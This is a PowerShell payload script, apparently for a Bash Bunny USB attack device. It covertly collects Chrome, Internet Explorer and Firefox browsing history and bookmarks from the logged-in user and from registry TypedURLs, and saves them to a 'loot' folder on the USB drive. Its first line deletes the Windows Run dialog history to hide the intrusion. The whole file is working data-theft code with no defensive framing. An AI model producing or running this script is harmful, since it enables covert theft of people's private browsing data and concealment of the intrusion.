﻿#Remove run history
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

#Set default encoding
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'


#Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "bashbunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

#See if a info folder exist in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\info\" + $computerSystem.Name 
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

$datetime = get-date -f yyyy-MM-dd_HH-mm
#Set Bash Bunny as Target Directory
$backupPath = $TARGETDIR + "\"
 
 
#Set Username
$Username = $env:USERNAME

#Regex for Browser URL
$Regex6 = '(www|http|ftp|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
 
#Getting Chrome Browser Information
$Value = Get-Content -Path "$Env:systemdrive\Users\$Username\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $Regex6 |%  {($_.Matches).Value} |Sort -Unique 

#IE History
$Shell = New-Object -ComObject Shell.Application
$IEHistory = $Shell.NameSpace(34)
#Get Folder used History and Put inside Object
$Objs = @()
$Items = $IEHistory.Items()
Foreach($Item in $Items)
{
    If($Item.IsFolder -and $Item.Name )
    {
        $WebSiteItems = $Item.GetFolder.Items()
        Foreach($WebSiteItem in $WebSiteItems)
        {
            If($WebSiteItem.IsFolder)
            {
                $SiteFolder = $WebSiteItem.GetFolder
                $SiteFolder.Items()|Foreach{
                                            $URL = $($SiteFolder.GetDetailsOf($_,0))
                                            $UrlName =  $($SiteFolder.GetDetailsOf($_,1)) 
                                            $Date = $($SiteFolder.GetDetailsOf($_,2))
                                            
                                          

                $Obj = New-Object -TypeName PSObject -Property @{
                                                                URL = $URL
                                                                URI_and_File = $UrlName
                                                                Date = $Date
                                                               }
                $Objs += $Obj}
            }
        }
    }
}

function Get-BrowserData {

    [CmdletBinding()]
    Param
    (
        [Parameter(Position = 0)]
        [String[]]
        [ValidateSet('Chrome','IE','FireFox', 'All')]
        $Browser = 'All',

        [Parameter(Position = 1)]
        [String[]]
        [ValidateSet('History','Bookmarks','All')]
        $DataType = 'All',

        [Parameter(Position = 2)]
        [String]
        $UserName = ''
    )



    function ConvertFrom-Json20([object] $item){
        #http://stackoverflow.com/a/29689642
        Add-Type -AssemblyName System.Web.Extensions
        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        return ,$ps_js.DeserializeObject($item)
        
    }

    function Get-ChromeHistory {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[!] Could not find Chrome History for username: $UserName"
        }
        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex6 |% {($_.Matches).Value} |Sort -Unique
        $Value | ForEach-Object {
            $Key = $_
                    Write-Output $_
        }        
    }

    function Get-ChromeBookmarks {
    $testVariable
    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    if (-not (Test-Path -Path $Path)) {
        Write-Verbose "[!] Could not find FireFox Bookmarks for username: $UserName"
    }   else {
            $Json = Get-Content $Path
            $Output = ConvertFrom-Json20($Json)
            $Jsonobject = $Output.roots.bookmark_bar.children
            $Jsonobject.url |Sort -Unique | ForEach-Object {
                        Write-Output $_ 
            }
        }
    }

    function Get-InternetExplorerHistory {
        #https://crucialsecurityblog.harris.com/2011/03/14/typedurls-part-1/

        $Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
        $Paths = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

        ForEach($Path in $Paths) {

            $User = ([System.Security.Principal.SecurityIdentifier] $Path.PSChildName).Translate( [System.Security.Principal.NTAccount]) | Select -ExpandProperty Value

            $Path = $Path | Select-Object -ExpandProperty PSPath

            $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
            if (-not (Test-Path -Path $UserPath)) {
                Write-Verbose "[!] Could not find IE History for SID: $Path"
            }
            else {
                Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $Key = $_
                    $Key.GetValueNames() | ForEach-Object {
                        $Value = $Key.GetValue($_)
                                Write-Output $Value
                    }
                }
            }
        }
    }

    function Get-InternetExplorerBookmarks {
        $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
        ForEach ($URL in $URLs) {
            if ($URL.FullName -match 'Favorites') {
                $User = $URL.FullName.split('\')[2]
                Get-Content -Path $URL.FullName | ForEach-Object {
                    try {
                        if ($_.StartsWith('URL')) {
                            # parse the .url body to extract the actual bookmark location
                            $URL = $_.Substring($_.IndexOf('=') + 1)
                                    Write-Output $URL
                        }
                    }
                    catch {
                        Write-Verbose "Error parsing url: $_"
                    }
                }
            }
        }
    }

    function Get-FireFoxHistory {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[!] Could not find FireFox History for username: $UserName"
        }
        else {
            $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex6 -AllMatches |Select-Object -ExpandProperty Matches |Sort -Unique
            $Value.Value |ForEach-Object {
               
                    ForEach-Object {
                        Write-Output $_
                }
            }
        }
    }
    if (!$UserName) {
        $UserName = "$ENV:USERNAME"
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'Chrome')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-ChromeHistory
        }
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-ChromeBookmarks
        }
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'IE')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-InternetExplorerHistory
        }
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-InternetExplorerBookmarks
        }
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'FireFox')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-FireFoxHistory
        }
    }

}


#Write out to file Chrome History
($Value | Out-File -FilePath ($backupPath+"Browser History.txt"))
#Write out to file Folders       
(($Objs |Out-String -Width 600 ).Trim() |Sort -Descending | Out-File -FilePath ($backupPath+"IE Browser History.txt")) 

#Write out Chrome Bookmarks
$ChromeBookmarks =Get-BrowserData -Browser Chrome -DataType Bookmarks -UserName $Username 
if ($ChromeBookmarks -ne $null) {
$ChromeBookmarks >> ($backupPath+"Browser History.txt") 
}

#Write out IE Browser History
$IEHistory =Get-BrowserData -Browser IE -DataType History -UserName $Username 
if ($IEHistory -ne $null) {
$IEHistory >> ($backupPath+"Browser History.txt") 
}

#Write out IE Bookmarks
$IEBookmarks =Get-BrowserData -Browser IE -DataType Bookmarks -UserName $Username 
if ($IEBookmarks -ne $null) {
$IEBookmarks >> ($backupPath+"Browser History.txt") 
}

#Write out Firefox History
$firefoxBrowser = Get-BrowserData -Browser FireFox -DataType History -UserName $Username
if ($firefoxBrowser -ne $null) {
 $firefoxBrowser >> ($backupPath+"Browser History.txt") 
}

#Write out Firefox Bookmarks
$firefoxBookmark= Get-BrowserData -Browser FireFox -DataType Bookmarks -UserName $Username
if ($firefoxBookmark -ne $null){
$firefoxBookmark >> ($backupPath+"Browser History.txt")
}

